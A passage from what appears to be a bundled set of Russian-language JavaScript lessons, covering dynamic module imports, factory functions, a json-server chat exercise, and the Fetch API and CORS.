скрипты импортируются динамически, последовательно, с задержкой в несколько секунд^^\n\n◘◘![ico-20 paper]◘◘\n\n~~~js\nconst scriptPath = 'https://garevna.github.io/js-samples/js/index'\n\nimport(`${scriptFile}12.js`)\n  .then(module => setTimeout(() => import(`${scriptPath}21.js`)))\n  .then(setTimeout(() => import(`${scriptPath}22.js`), 10000))\n~~~\n\n^^Используем асинхронную функцию для упрощения кода:^^\n\n◘◘![ico-20 paper]◘◘\n\n~~~js\nconst scriptImports = async moduleFile => {\n  const timeOut = timeInterval => new Promise(resolve => setTimeout(() => resolve(), timeInterval))\n\n  await import(`${moduleFile}12.js`)\n  await timeOut(8000)\n  await import(`${moduleFile}21.js`)\n  await timeOut(12000)\n  await import(`${moduleFile}22.js`)\n}\n\nscriptImports('https://garevna.github.io/js-samples/js/index')\n~~~\n\n_____________________________________________________\n\n![ico-30 cap] ** 3**\n\nПредположим, в разметке мы подключили скрипт **~index.js~**\n\n◘◘^^![ico-20 paper] index.html^^◘◘\n\n~~~html\n&lt;!DOCTYPE html>\n&lt;html>\n  &lt;head>\n    &lt;meta charset=\"utf-8\">\n    &lt;title>ES Modules&lt;/title>\n&lt;/head>\n\n  &lt;body>\n    &lt;script src=\"js/index.js\">&lt;/script>\n  &lt;/body>\n\n&lt;/html>\n~~~\n\nКод файла **~index.js~** создает элемент ~&lt;script>~ с атрибутом **~type = \"module\"~** и вставляет его на страницу\n\n~~~js\nconst mod = document.body\n  .appendChild(document.createElement('script'))\nmod.type = 'module'\n~~~\n\nВ элемент ~&lt;script>~ помещается код, который импортирует функцию **_~showMessage~_** из файла **~js/testESModules.js~**\n\nи вызывает ее с текстом \"_Hi, students! Welcome to new age of ES Modules!_\"\n\n~~~js\nmod.textContent = `\n  import { showMessage } from './js/testESModules.js'\n  showMessage('Hi, students! Welcome to new age of ES Modules!')\n`\n~~~\n\nПолный код:\n\n◘◘^^![ico-20 paper] js/index.js^^◘◘\n\n~~~js\nconst mod = document.body\n  .appendChild(document.createElement('script'))\n\nmod.type = 'module'\n\nmod.textContent = `\n  import { showMessage } from './js/testESModules.js'\n  showMessage('Hi, students! Welcome to new age of ES Modules!')\n`\n~~~\n\nИменованый экспорт в файле **~js/testESModules.js~**\n\n◘◘^^![ico-20 paper] js/testESModules.js^^◘◘\n\n~~~js\nexport function showMessage (message) {\n  const demo = document.body.appendChild(document.createElement('div'))\n  demo.style = `\n    position: fixed;\n    top: 15%; left: 15%;\n    bottom: 15%; right: 15%;\n    box-shadow: 8px 8px 12px #00000090;\n    border: solid 0.5px #bbb;\n    padding: 32px;\n    z-index: 300;\n    background-color: #000;\n  `\n  demo.innerHTML = `\n    <h2 style='color: #789'>Module was successfully imported</h2>\n    <p style='color: #fa0'>Now you can see how it works :)</p>\n    <hr>\n    <p style='color: #dde'>${message}</p>\n  `\n  setTimeout(() => document.body.removeChild(demo), 10000)\n}\n~~~\n\n{{{dynamic-import-3.js}}}\n\n__________________________________________________________\n\n![ico-20 warn] При импорте модулей следует указывать или полный путь:\n\n~~~js\nimport { showMessage } from 'https://example.com/js/testESModules.js'\n~~~\n\nили относительный путь, начинающийся с ~ /~, ~./~ или ~../~:\n\n~~~js\nimport { showMessage } from './js/testESModules.js'\n~~~\n\nВ противном случае импорт завершится неудачей\n\n________________________________________________________________________\n\n\n[![ico-25 cap] **Live demo**](samples/25)\n\n______________________________________________________________________\n"},47267:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Фабричные методы\n\n| ![](illustrations/douglas-crockford.jpg) | «_I think the lack of classes is one of JavaScript's great strengths_»<hr>[Douglas Crockford](external/crockford) |\n\n☼☼☼ Лише скажи 'new' і кожна function поверне об'єкт ☼☼☼\n\n^^Причем не важно, есть или нет в теле функции оператор ~return~.^^\n\nЕсли она делает это без использования ключевого слова **_~new~_**, то такая функция является **фабрикой**:\n\n~~~js\nconst creator = (name, age) => ({ name, age })\n~~~\n\nВ этом примере мы используем стрелочную функцию, которая по определению не может быть конструктором ввиду отсутствия у нее свойства **~prototype~**.\nОна является фабрикой, потому что возвращает объект.\nИ этот объект не будет ничего знать о функции **~creator~**. Он будет экземпляром **~Object~**.\n\n![ico-20 warn] Функция может быть либо фабрикой, либо конструктором.\nДокажем это утверждение.\n\nНеобходимым, но недостаточным (![ico-20 warn]) условием того, чтобы функция стала фабрикой, является наличие оператора **~return~**.\n\n![ico-25 cap] ** 1**\n\n~~~js\nfunction creator = (name, age) {\n  return { name, age }\n}\n~~~\n\nВ этом примере функция **~creator~** возвращает объект. Отлично, посмотрим, что она вернет, если мы вызовем ее с ключевым словом **~new~**:\n\n~~~js\nconst user = new creator('Piter', 25)\n\nconsole.log(user instanceof creator) // false\n\nconsole.log(user instanceof Object) // true\n~~~\n\nФункция **~creator~** уже не может быть конструктором, и использование ключевого слова **~new~** никак не влияет на ее поведение.\n\nФункция **~creator~** создает экземпляры конструктора **~Object~**.\n\n____________________________\n\n![ico-25 cap] ** 2**\n\n~~~js\nfunction creator () {\n  return Array.from(arguments)\n}\n\nconst obj = new creator(5, 8, 7)\n\nobj instanceof creator  // false\n~~~\n\nВ этом примере функция **~creator~** возвращает массив.\nНо массив является объектом, поэтому функция **~creator~** обречена быть фабрикой, и никогда не сможет стать конструктором.\n\n____________________________\n\n![ico-25 cap] ** 3**\n\n~~~js\nfunction simple () {\n  return Math.min(...arguments)\n}\n\nconst obj = new simple\n\nobj instanceof simple  // true\n~~~\n\nФункция **~simple~** возвращает число (возможно, NaN или ~Infinity~). Можно ли сказать, что она является фабрикой? - Нет, поскольку она возвращает **не объект**.\nБудучи вызвана с ключевым словом **~new~**, она возвращает экземпляр **~simple~**.\n\nАналогичная ситуация будет в случае, если функция возвращает строку, или ~null~, или ~undefined~. Можете проверить самостоятельно.\n\nТ.е. функция будет фабрикой только в том случае, если она возвращает экземпляр **~Object~**.\n______________________________\n\n## ![ico-20 icon] ООП-объекты и структуры данных\n\n••^^Роберт Мартин, «Чистый код»:^^••\n••_Объекты предоставляют поведение и скрывают данные<br/>Структуры данных предоставляют данные,<br/>но не обладают сколько-нибудь значительным поведением_••\n\n![ico-25 cap] ** 4**\n\n**Паттерн \"_Модуль_\"**\n\n^^В этом примере с помощью IIFE и замыкания создается объект, данные которого скрыты от непосредственного доступа и доступны только через интерфейс, представленный методом _**getVar**_^^\n\n~~~js\nconst google = (function (params, pin) {\n  return {\n    getVar (varName, pincode) {\n      return pin === pincode ? params[varName] : 'Forbidden'\n    }\n  }\n})({\n  name: 'Google',\n  token: 'A7fgh14-771pd-ufr147'\n}, '789541')\n\nconsole.log(google.getVar('token'))            // No access\nconsole.log(google.getVar('name', '789541'))   // Google\n~~~\n\n^^Выведем объект **google** в консоль:^^\n\n~~~console\n\n▼ User {name: \"Google\", getVar: ƒ}\n  ► getVar: ƒ getVar( varName, pincode )\n    name: \"Google\"\n  ► __proto__: Object\n\n~~~\n\n_____________________________\n\n![ico-25 cap] ** 5**\n\n^^В этом примере мы делаем то же самое, но используя расширение класса _User_^^\n^^Конструктор класса создает публичное свойство _name_^^\n^^Фабричный метод класса _updateUser_ позволяет расширить функционал класса, создать скрытые данные, доступные через интерфейс ( метод _**getVar**_ )^^\n\n~~~~js\nclass User {\n  constructor (name) {\n    this.name = name || 'unknown'\n  }\n}\n\nUser.updateUser = function (user, params, pin) {\n  return Object.assign(user, {\n    getVar (varName, pincode) {\n      return pin === pincode ? params[varName] : 'Access denied'\n    }\n  })\n}\n\nconst google = User.updateUser(new User('Google'), {\n  token: 'AfG78-1nm*15ph',\n  cash: 25000\n}, '789451')\n\ngoogle.getVar('token', '789451')  // \"AfG78-1nm*15ph\"\ngoogle.getVar('cash', '789451')   // 25000\n~~~~\n\n^^Выведем объект **google** в консоль:^^\n\n~~~console\n\n▼ User {name: \"Google\", getVar: ƒ}\n  ► getVar: ƒ getVar( varName, pincode )\n    name: \"Google\"\n  ▼ __proto__:\n      ▼ constructor: class User\n          ► updateUser: ƒ ( user, params, pin )\n            arguments: (...)\n            caller: (...)\n            length: 1\n            name: \"User\"\n            prototype: {constructor: ƒ}\n          ► __proto__: ƒ ()\n      ► __proto__: Object\n\n~~~\n\n__________________________________\n\n## ![ico-25 icon] Полиморфизм\n\nФабричные методы дают возможность расширять функциональность конструктора, обеспечивая его полиморфизм.\n\nВ следующем примере конструктор  **User**  имеет фабричный метод   **_createNewUser_**,\nпозволяющий создавать экземпляры класса с различным набором свойств и методов.\n\nэкземпляры  **visitor**  и  **currentUser**,  созданные конструктором  **User**,\nимеют различные свойства и методы.\n\n![ico-25 cap] ** 6**\n\n~~~~js\nfunction User () {\n  this.talk = function (key) {\n    document.write(`<p>${key}: <b>${this[key]}</b></p>`)\n  }\n}\n\nUser.createNewUser = function (params) {\n  const user = new this\n  for (const key in params) user[key] = params[key]\n  return user\n}\n\nconst visitor = User.createNewUser({\n  name: 'migrant',\n  timeVisit: new Date().toLocaleString()\n})\n\nvisitor.talk('name')\nvisitor.talk('timeVisit')\n\nconst currentUser = User.createNewUser({\n  name: prompt('What is your name?'),\n  age: prompt('How old are you?'),\n  id: Date.now(),\n  posts: {},\n  registered: new Date().toISOString().slice(0, 10),\n  write: function (text) {\n    this.posts = Object.assign(this.posts, {\n      [new Date().toLocaleString()] : text\n    })\n  }\n})\n\ncurrentUser.talk('name')\ncurrentUser.talk('registered')\ncurrentUser.write(`I'm here since ${new Date().toLocaleString()}`)\n~~~~\n\n_____________________________\n\n**visitor**\n\n~~~console\n\n▼ User {talk: ƒ, name: \"migrant\", timeVisit: \"01.11.2018, 13:40:41\"}\n    name: \"migrant\"\n  ► talk: ƒ ( key )\n    timeVisit: \"01.11.2018, 13:40:41\"\n  ► __proto__: Object\n\n~~~\n\n______________________________\n\n**currentUser**\n\n~~~console\n\n▼ User {talk: ƒ, name: \"Nick\", age: \"25\", id: 80661698, posts: {…}, …}\n    age: \"25\"\n    id: 80661698\n    name: \"Nick\"\n  ▼ posts:\n        01.11.2018, 13:40:51: \"I'm here since 01.11.2018, 13:40:51\"\n      ► __proto__: Object\n  ► registered: (2) [\"01.11.2018\", \"13:40:51\"]\n  ► talk: ƒ ( key )\n  ► write: ƒ ( text )\n  ► __proto__: Object\n\n~~~\n\n_________________________________________\n\n\n~~~js\nconsole.dir(currentUser.__proto__.constructor)\n~~~\n\n~~~console\n\n▼ ƒ User()\n    createNewUser: ƒ ( params )\n    arguments: null\n    caller: null\n    length: 0\n    name: \"User\"\n    prototype: {constructor: ƒ}\n  ► __proto__: ƒ ()\n\n~~~\n\nПолучили _перечислимый_ статический метод **_createNewUser_** конструктора.\n\nСделаем то же самое с помощью класса:\n\n~~~js\nclass User {\n  constructor () {\n    this.talk = function (key) {\n      document.write(`<p>${key}: <b>${this[key]}</b></p>`)\n    }\n  }\n\n  static createNewUser (params) {\n    const user = new this\n    for (const key in params) user[key] = params[key]\n    return user\n  }\n}\n~~~\nВ этом случае статический метод класса **_createNewUser_** будет неперечислимым,<br/>\nа в остальном все будет аналогично варианту с конструктором<br/>\n^^Так что \"под капотом\" работает все то же прототипное наследование, только с косметическими \"добавками\".^^\n"},44182:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 hw] Fake chat\n\n_____________________________\n\n## ![ico-25 icon] db.json\n\nВнесем некоторые изменения в базу данных **db.json**\n\n![ico-20 green-ok] **lastUpdate**\n\nДобавим запись **_~lastUpdate~_** с двумя полями:\n\n~~~js\n\"lastUpdate\": {\n  \"data\": \"26.10.2018\",\n  \"time\": \"12:38:01\"\n}\n~~~\n\n^^Мы будем использовать эти данные для обновления чата^^\n^^после того, как данные в **~db.json~**  были обновлены^^\n^^(операции ~POST~ &#124; ~PUT~ &#124; ~DELETE~)^^\n\n![ico-20 green-ok] **posts**\n\nВ каждую запись базы данных **~posts~** добавим свойства **~date~** и **~time~**\n\n~~~js\n\"posts\": [\n  {\n    \"id\": 0,\n    \"date\": \"05.08.2018\",\n    \"time\": \"10:30:15\",\n    \"userId\": 2,\n    \"title\": \"My first post here\",\n    \"body\": \"It's really wonder!\"\n  },\n  ...\n}\n~~~\n\n__________________________________________\n\n## ![ico-25 icon] json-server\n\n![ico-25 bash] Запускаем  json-server\n\n••son-server &#45;&#45;watch db.json••\n\nПолучаем **endpoints**:\n\n~~~console\nResources\n  http://localhost:3000/lastUpdate\n  http://localhost:3000/users\n  http://localhost:3000/posts\n  http://localhost:3000/comments\n\nHome\n  http://localhost:3000      \n~~~\n\n__________________________\n\n• Открываем в браузере страницу **http://localhost:3000**\n• заходим в _Chrome DevTools_\n• Создаем  snippet\n\n____________________\n\n## ![ico-25 icon] Переменные и функции\n\n#### ![ico-20 green-ok] lastUpdate\n\nОбъявляем переменную **_~lastUpdate~_**, в которой будем хранить дату и время модификации загруженных данных\n\n~~~js\nlet lastUpdate\n~~~\n\n#### ![ico-20 green-ok] getData\n\nОбъявляем переменную **_~getData~_**, в которой будет ссылка на функцию, загружающую данные с сервера по имени ресурса ( **_~lastUpdate~_**, **_~users~_**, **_~posts~_**, **_~comments~_** )\n\n~~~js\nconst getData = function (ref) {\n  const promise = callback => fetch('http://localhost:3000/' + ref)\n    .then(response => response.json())\n    .then(response => callback(response))\n\n  return new Promise(resolve => promise(resolve))\n}\n~~~\n\n#### ![ico-20 green-ok] appElem\n\nОбъявляем переменную **_~appElem~_**\nВ этой переменной будет ссылка на анонимную стрелочную функцию\nФункция получает в первом аргументе имя тега **_~tagName~_**,\nи создает элемент DOM\nВторой ( опциональный ) аргумент **_~container~_** может содержать ссылку на элемент-контейнер, куда нужно вставить созданный элемент\nЕсли такой аргумент отсутствует, то функция вставляет элемент в _~document.body~_\n\n~~~js\nconst addElem = (tagName, container = document.body) => container.appendChild(document.createElement(tagName))\n~~~\n\n#### ![ico-20 green-ok] chat\n\nссылка на элемент DOM, который будет контейнером для сообщений чата\n\n#### ![ico-20 green-ok] posts & users\n\nВ переменные ~posts~ и ~users~ будем получать данные из базы данных на сервере\n\n#### ![ico-20 green-ok] currentUser\n\nобъект активного пользователя чата (от лица которого мы будем писать в чат)\n\n~~~js\nlet currentUser\n~~~\n\n#### ![ico-20 green-ok] chatInput\n\nСоздаем элемент ~input~ (поле для ввода текста сообщения) и стилизуем элемент:\n\n~~~js\nconst chatInput = Object.assign(addElem('input'), {\n  style: `\n    position: fixed;\n    left: 20px;\n    width: 80%;\n    bottom: 10px;\n    border: inset 1px;\n    background-color: #af9;\n    overflow: auto;\n  `\n})\n~~~\n\n#### ![ico-20 green-ok] buildChat\n\nСсылка на функцию, создающую элемент section (это будет чат)\n\n~~~js\nconst buildChat = function () {\n  return Object.assign(addElem('section'), {\n    style: `\n      position: fixed;\n      top: 30px;\n      left: 20px;\n      right: 20px;\n      bottom: 70px;\n      border: inset 1px;\n      overflow: auto;\n      padding: 10px;\n    `,\n    innerHTML: ''\n  })\n}\n\nconst chat = buildChat()\n~~~\n\n#### ![ico-20 green-ok] initChat\n\nПосле вызова функции **~buildChat~** в переменной **~chat~** будет ссылка на элемент **~section~**, который будет контейнером для сообщений в чате\n\nАсинхронная функция **~initChat~** будет итерировать массив **~post~** с помощью метода **~forEach~**\nзаполнять контейнер **~chat~** данными из массива **~post~**\n(данные к моменту вызова функции должны быть уже получены от сервера)\n\nВ первую очередь контейнер **~chat~** освобождается: ~chat.innerHTML = ''~\n\nНа каждой итерации по значению **~post.userId~** находится соответствующий элемент массива **~users~** (с помощью метода  **~filter~**)\n\nНа каждой итерации создается элемент ~div~, который будет контейнером для очередной записи из массива **~post~**\n\nДля создания новых элементов DOM  и вставки их на страницу используем асинхронную функцию **~appElem~**\n\n~~~~js\nconst initChat = async function () {\n  posts.forEach(post => {\n    const user = users.find(user => user.id === post.userId)\n    chat.appendChild((function () {\n      const cont = addElem('div')\n      const ava = Object.assign(addElem('img', cont), {\n        src: user.photoURL,\n        width: 40,\n        title: `${user.name} ${user.lastName}`\n      })\n\n      addElem('span', cont).innerHTML = ` <small> ${post.date} ${post.time}</small>`\n      addElem('p', cont).innerText = post.body\n      return cont\n    })(user))\n  })\n}\n~~~~\n\n__________________________\n\n#### ![ico-20 green-ok] updateChat\n\nОбъявляем переменную **~updateChat~**, в которую помещаем ссылку на асинхронную анонимную функцию **~updateChat~**\n\n![ico-20 pin] Используем функцию **~getData~** для получения даты и времени последнего обновления базы данных\nв переменную **~updated~**,\nиспользуя ключевое слово **_~await~_**, чтобы дождаться результата асинхронной операции\n\n![ico-20 pin] Сравниваем дату и время обновления загруженных данных\nс датой и временем последнего обновления базы данных\nЕсли загруженные данные актуальны\n( после их загрузки обновлений базы данных не было ),\nто завершаем выполнение функции **~updateChat~** ( *~return~* )\n\n![ico-20 pin] В противном случае формируем массив промисов:\n\n~~~js\n[getData('users'), getData('posts')]\n~~~\n\nи передаем его методу **~Promise.all~**,\nкоторый также вызываем с ключевым словом **_~await~_**\n\n![ico-20 pin] Когда **_~Promise.all~_**  будет разрешен, проверяем, есть ли значение\nу объявленной ранее переменной **~currentUser~**\n( пользователь, от лица которого будут добавляться сообщения в чат )\nЕсли активный пользователь еще не определен,\nвыбираем его случайным образом из числа всех зарегистрированных пользователей ( **~users~** )\n\n![ico-20 pin] Вызываем функцию **~initChat ()~**\n\n~~~~js\nconst updateChat = async function () {\n  const updated = await getData('lastUpdate')\n\n  if (lastUpdate && updated.data === lastUpdate.data && updated.time === lastUpdate.time) return\n\n  const scrollValue = chat.scrollTop\n\n  const [users, posts] = await Promise.all([getData('users') , getData('posts')])\n\n  if (!currentUser) {\n    currentUser = users[Math.floor(Math.random() * users.length)]\n    currentUserId = currentUser.id\n  }\n\n  initChat()\n  chat.scrollTop = scrollValue\n}\n~~~~\n\nСвойство **_~scrollTop~_** можно использовать для управления прокруткой чата\nЕсли установить\n\n~~~js\nchat.scrollTop = chat.offsetTop\n~~~\n\nто элемент **~chat~** будет прокручен до конца\n(мы будем видеть последние сообщения в чате)\n\n\n_______________________________________________\n\n## ![ico-25 icon] Запуск\n\n• вызваем **~buildChat()~**, чтобы создать контейнер для чата\n• вызваем **~updateChat()~**, чтобы заполнить контейнер данными\n• устанавливаем интервал обновления чата (~setInterval~)\n\n^^через заданные интервалы времени мы будем вызывать ~updateChat()~,^^\n^^чтобы проверить, было ли за это время обновление базы данных на серевере,^^\n^^и если да - обновлять содержимое чата на клиенте^^\n\n• вешаем обработчика события **change** элемента **chatInput**\n^^если клиент введет сообщение, это сообщение нужно отправить на сервер для добавления в базу данных^^\n\nИтак:\n\n~~~~js\nconst chat = buildChat()\n\nupdateChat()\n\nsetTimeout(() => { chat.scrollTop = chat.scrollHeight }, 100)\n\nconst interval = setInterval(() => updateChat(), 1000)\n\nchatInput.onchange = function (event) {\n  const postTime = new Date().toLocaleString().split(', ')\n  fetch('http://localhost:3000/posts', {\n    method: 'POST',\n    body: JSON.stringify({\n      date: postTime[0],\n      time: postTime[1],\n      userId: currentUserId,\n      body: event.target.value\n    }),\n    headers: {\n      'Content-type': 'application/json'\n    }\n  })\n}\n~~~~\n\n___________________________\n\n## ![ico-20 file] Полный код сниппета\n\n~~~~js\ndocument.body.style = `\n  font-family: monospace, Arial;\n  font-size: 14px;\n`\n\nlet lastUpdate\n\nconst getData = function (ref) {\n  const promise = callback => fetch('http://localhost:3000/' + ref)\n    .then(response => response.json())\n    .then(response => callback(response))\n\n  return new Promise(resolve => promise(resolve))\n}\n\nconst addElem = (tagName, container = document.body) => container.appendChild(document.createElement(tagName))\n\n// let posts\n// let users\n\nlet currentUser\n\nconst chatInput = Object.assign(addElem('input'), {\n  style: `\n    position: fixed;\n    left: 20px;\n    width: 80%;\n    bottom: 10px;\n    border: inset 1px;\n    background-color: #af9;\n    overflow: auto;\n  `\n})\n\nconst buildChat = function () {\n  return Object.assign(addElem('section'), {\n    style: `\n      position: fixed;\n      top: 30px;\n      left: 20px;\n      right: 20px;\n      bottom: 70px;\n      border: inset 1px;\n      overflow: auto;\n      padding: 10px;\n    `,\n    innerHTML: ''\n  })\n}\n\nconst updateChat = async function () {\n  const updated = await getData('lastUpdate')\n\n  if (lastUpdate && updated.data === lastUpdate.data && updated.time === lastUpdate.time) return\n\n  const scrollValue = chat.scrollTop\n\n  const [users, posts] = await Promise.all([getData('users') , getData('posts')])\n\n  console.log(users)\n  console.log(posts)\n\n  if (!currentUser) {\n    currentUser = users[Math.floor(Math.random() * users.length)]\n    currentUserId = currentUser.id\n  }\n\n  initChat()\n  chat.scrollTop = scrollValue\n}\n\nconst initChat = async function () {\n  posts.forEach(post => {\n    const user = users.find(user => user.id === post.userId)\n    chat.appendChild((function () {\n      const cont = addElem('div')\n      const ava = Object.assign(addElem('img', cont), {\n        src: user.photoURL,\n        width: 40,\n        title: `${user.name} ${user.lastName}`\n      })\n\n      addElem('span', cont).innerHTML = ` <small> ${post.date} ${post.time}</small>`\n      addElem('p', cont).innerText = post.body\n      return cont\n    })(user))\n  })\n}\n\nconst chat = buildChat()\n\nupdateChat ()\n\nsetTimeout(() => { chat.scrollTop = chat.scrollHeight }, 100)\n\nconst interval = setInterval(() => updateChat(), 500)\n\nchatInput.onchange = function (event) {\n  const postTime = new Date().toLocaleString().split(', ')\n  fetch('http://localhost:3000/lastUpdate', {\n    method: 'POST',\n    body: JSON.stringify({\n      data: postTime[0],\n      time: postTime[1]\n    }),\n    headers: {\n      'Content-type': 'application/json'\n    }\n  })\n  fetch('http://localhost:3000/posts', {\n    method: 'POST',\n    body: JSON.stringify ({\n      date: postTime [0],\n      time: postTime [1],\n      userId: currentUser.id,\n      body: event.target.value\n    }),\n    headers: {\n      'Content-type': 'application/json'\n    }\n  })\n}\n~~~~\n"},60949:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] AJAX\n\n_____________________________________________________\n\n## ![ico-25 icon] CORS\n\n^^^[Cross-Origin Resource Sharing]\n\n^^По соображениям безопасности браузеры ограничивают кросс-доменные запросы, инициированные из скриптов.^^\n^^XMLHttpRequest и Fetch API следуют политике одинакового происхождения (same-origin).^^\n^^Это означает, что веб-приложение, использующее эти API, может запрашивать только ресурсы из того же источника, из которого было загружено приложение (если только ответ от другого источника не содержит правильные заголовки CORS)^^\n______________________\n**_Cross-Origin Resource Sharing_** (**CORS**) - это механизм, который использует дополнительные заголовки HTTP, чтобы сообщить браузеру, что веб-приложение, работающее в одном домене, имеет разрешение на доступ к выбранным ресурсам другого домена.\n\n^^^\n______________\n\n# ![ico-30 icon] Fetch API\n\n^^Fetch API является продвинутой альтернативой XMLHttpRequest.^^\n\nFetch API предоставляет глобальный метод **~fetch()~** для асинхронного доступа к ресурсам в сети.\n\nМетод **~fetch~** отправляет объект запроса на сервер и возвращает **_промис_**.\n\nСамый простой объект GET-запроса может включать только URI ресурса.\n\n~~~js\nfetch(\'message.txt\')\n  .then(response => { ... })\n~~~\n\n^^При возникновении ошибок HTTP (404, 500 и т.д.) возвращаемый методом fetch() промис разрешится нормально^^\n^^(В таком случае он вернет значение ~false~ опции статуса **~ok~**)^^\n^^![ico-20 warn] Он завершится с ошибкой только при сбое сети^^\n\nКогда промис завершится, он вернет объект **~Response~**\n\n_____________________________________________________________\n\n## ![ico-25 icon] Request\n\n**Конструктор**\n\nС его помощью можно создать объект запроса\n\n^^^[Request]\n\nВ свойстве **~prototype~** конструктора **~Request~** находятся все наследуемые экземплярами свойства и методы:\n\n| ^^Свойства^^                | ^^Методы^^            |\n| ^^**bodyUsed**^^            | ^^**arrayBuffer()**^^ |\n| ^^cache^^                   | ^^**blob()**^^        |\n| ^^**credentials**^^         | ^^clone()^^           |\n| ^^destination^^             | ^^**formData()**^^    |\n| ^^**headers**^^             | ^^**json()**^^        |\n| ^^**integrity**^^           | ^^**text()**^^        |\n| ^^isHistoryNavigation^^     |                       |\n| ^^keepalive^^               |                       |\n| ^^**method**^^              |                       |\n| ^^**mode**^^                |                       |\n| ^^redirect^^                |                       |\n| ^^referrer^^                |                       |\n| ^^referrerPolicy^^          |                       |\n| ^^signal^^                  |                       |\n| ^^**url**^^                 |                       |\n\n^^^\n________________________________________________\n\n![ico-25 cap] ** 1**\n\nСоздадим с помощью конструктора **~Request~** простой объект запроса:\n\n~~~js\nconst request = new Request(\'https://api.github.com/users\')\n~~~\n\nи выведем его в консоль:\n\n~~~~Request\n▼ Request {method: "GET", url: "https://api.github.com/users", headers: Headers, destination: "", referrer: "about:client", …}\n    bodyUsed: false\n    cache: "default"\n    credentials: "same-origin"\n    destination: ""\n  ► headers: Headers {}\n    integrity: ""\n    isHistoryNavigation: false\n    keepalive: false\n    method: "GET"\n    mode: "cors"\n    redirect: "follow"\n    referrer: "about:client"\n    referrerPolicy: ""\n  ► signal: AbortSignal {aborted: false, onabort: null}\n    url: "https://api.github.com/users"\n  ► __proto__: Request\n~~~~\n\nМы видим дефолтные значения опций запроса, которые мы не устанавливали.\n\nДавайте установим некоторые опции:\n\n~~~js\nconst request = new Request(\'https://api.github.com/users\', {\n  credentials: \'include\',\n  mode: \'same-origin\',\n  headers: new Headers({\n    \'Content-Type\' : \'application/json\'\n  })\n})\n\nrequest.headers.get(\'Content-Type\')\n~~~\n\nПосмотрим в консоли, что у нас получилось:\n\n~~~~Request\n▼ Request {method: "GET", url: "https://api.github.com/users", headers: Headers, destination: "", referrer: "about:client", …}\n    bodyUsed: false\n    cache: "default"\n    credentials: "include"\n    destination: ""\n  ► headers: Headers {}\n    integrity: ""\n    isHistoryNavigation: false\n    keepalive: false\n    method: "GET"\n    mode: "same-origin"\n    redirect: "follow"\n    referrer: "about:client"\n    referrerPolicy: ""\n  ► signal: AbortSignal {aborted: false, onabort: null}\n    url: "https://api.github.com/users"\n  ► __proto__: Request\n~~~~\n\nОбратите внимание, что в консоли мы видим как бы "пустой" объект заголовков:\n\n~~~console\n► headers: Headers {}\n~~~\n\nОднако это объект, данные которого "спрятаны" в приватных свойствах, и для доступа к ним у этого объекта есть ряд интефейсных методов:\n\n~~~~Headers\n▼ Headers {}\n  ▼ __proto__: Headers\n      ► append: ƒ append()\n      ► delete: ƒ delete()\n      ► entries: ƒ entries()\n      ► forEach: ƒ forEach()\n      ► get: ƒ ()\n      ► has: ƒ has()\n      ► keys: ƒ keys()\n      ► set: ƒ ()\n      ► values: ƒ values()\n      ► constructor: ƒ Headers()\n      ► Symbol(Symbol.iterator): ƒ entries()\n        Symbol(Symbol.toStringTag): "Headers"\n      ► __proto__: Object\n~~~~\n\nВоспользуемся методом ~get()~ для получения значения заголовка _Content-Type_:\n\n~~~js\nrequest.headers.get(\'Content-Type\') // "application/json"\n~~~\n\nДля создания заголовков запроса мы воспользовались конструктором **Headers**, хотя точно такой же результат мы получим в результате:\n\n~~~js\nconst request = new Request(\'https://api.github.com/users\', {\n  credentials: \'include\',\n  mode: \'same-origin\',\n  headers: {\n    \'Content-Type\' : \'application/json\'\n  }\n})\n~~~\n\nДавайте разберемся, что означают некоторые опции объекта запроса.\n\n| ^^Опция^^ | ^^Описание^^ |\n| **~method~** | ^^**GET** - получить данные<br>**POST** - создание нового ресурса<br>**PUT** - обновление существующего ресурса<br>**DELETE** - удаление ресурса<br>**HEAD** - получение информации о ресурсе^^ |\n| **~mode~** | ^^**cors**<br>**no-cors**<br>**same-origin**^^ |\n|  **~credentials~**  | ^^**omit** - Никогда не использовать куки<br>**same-origin** - Значение по умолчанию<br>Учетные данные пользователя ( файлы cookie, данные http-аутентификации и т.д. ) отправляются с запросом только в том случае, если домен вызывающего скрипта и запрашиваемого ресурса совпадают<br>**include** - Учетные данные пользователя ( файлы cookie, данные http-аутентификации и т.д. ) отправляются в любом случае, даже в случае кросс-доменного запроса^^ |\n| **~integrity~** | ^^дайджест ( цифровая подпись ) ресурса<br>( Подробнее: SHA )^^ |\n| **~cache~** | ^^режим кэширования<br>default / reload / no-cache^^ |\n\n_______________________________________________\n\n### ![ico-20 icon] Опция method\n\n**Метод доступа к ресурсу** (CRUD)\n\n^^Ресурс - это любые данные на стороне сервера, имеющие **URI** (идентификатор ресурса)^^\n^^**URI** (_Uniform Resource Identifier_)^^\n^^Ресурсом может быть файл, база данных, запись в базе данных и т.д.^^\n\n~~~js\nconst request = new Request(\'https://httpbin.org/post\', {\n  method: \'GET\'\n})\n~~~\n\n_______________________________________________\n\n### ![ico-20 icon] Опция mode\n\nРежим запроса\n\n^^^[same-origin]\n\nЗапросы из других источников будут приводить к генерации исключения\n\n![ico-25 cap] ** 2**\n\n^^Например, такой запрос из консоли пустой страницы (_about:blank_)^^\n\n~~~js\nconst request = new Request(\'https://avatars2.githubusercontent.com/u/46?v=4\', {\n  mode: \'same-origin\'\n})\n\nfetch(request)\n  .then(response => console.log(response))\n~~~\n\n^^![ico-20 error] приведет к генерации следующего исключения:^^\n\n~~~console\nFetch API cannot load https://avatars2.githubusercontent.com/u/46?v=4\nRequest mode is "same-origin"\nbut the URL\'s origin is not same as the request origin null\n~~~\n\n^^Режим запроса **same-origin** (одного происхождения), а домен, которого сделан запрос (~null~) не совпадает с доменом, на который был отправлен запрос^^\n^^в результате чего промис завершится неудачей:^^\n\n![ico-20 error] ~Promise {<rejected>: TypeError: Failed to fetch~\n\n^^^\n\n^^^[no-cors]\n\nВ таком режиме при кросс-доменном запросе исключение не будет сгенерировано, но ответ будет пустым.\n\n_________________________________________________________\n\n![ico-25 cap] ** 3**\n\n~~~js\nconst request = new Request(\'https://avatars2.githubusercontent.com/u/46?v=4\', {\n  mode: \'no-cors\'\n})\n\nfetch(request)\n  .then(response => response.blob())\n  .then(response => console.log(response))\n~~~\n\n^^На такой запрос ответ будет: ~Blob(0) { size: 0, type: "" }~^^\n^^Если тот же запрос сделать без ~mode: \'no-cors\'~^^\n^^то ответ будет: 